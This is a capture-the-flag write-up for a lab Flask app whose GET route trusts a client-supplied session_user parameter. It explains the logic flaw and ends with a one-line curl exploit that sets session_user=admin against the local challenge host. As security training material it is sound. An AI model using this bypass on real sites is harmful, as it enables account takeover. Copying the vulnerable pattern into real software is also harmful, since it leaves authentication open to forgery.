# Challenge: Authentication Bypass 1

---

## Challenge Description

The challenge presents a simple Flask-based web application that uses an SQLite database to manage users.  
The goal is to **log in as `admin`** without knowing their password.

The challenge description hints that:
> The vulnerability arises from a gap between what the developer *expects* (that the URL parameters can only be set by the app) and the *reality* (that attackers can craft their own HTTP requests).

---

## Source Code Analysis

Let's focus on the key routes:

### **POST /** — Login Route

```python
@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    user = db.execute(
        "SELECT rowid, * FROM users WHERE username = ? AND password = ?",
        (username, password)
    ).fetchone()

    if not user:
        flask.abort(403, "Invalid username or password")

    return flask.redirect(f"""{flask.request.path}?session_user={username}""")
```


After a successful login, the app redirects to:

```
/?session_user=<username>
```

### **GET /** — Display Page

```python
@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.args.get("session_user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()
```

Here’s the issue:

* The `session_user` parameter is fully controlled by the client.

* There is no authentication check for the **GET** request.

* The app trusts the value of `session_user` blindly.

## Vulnerability

This is a logic flaw caused by misplaced trust in client-controlled data.

The developer assumed that session_user would only ever be set by a legitimate login request.
However, an attacker can manually craft a URL and set this parameter themselves.

## Exploitation

Simply provide the `session_user` parameter in the URL and set it to `admin`.

```SHELL
curl "http://challenge.localhost:80?session_user=admin"
```

| Component             | Issue                              | Description                                                         |
| --------------------- | ---------------------------------- | ------------------------------------------------------------------- |
| GET `/`               | Trusts user-controlled parameter   | `session_user` directly determines who is “logged in.”              |
| POST `/`              | Redirects using insecure parameter | Passes sensitive session info via the query string                  |
| No session validation | Missing server-side state          | The app never verifies the authenticity of the `session_user` value |
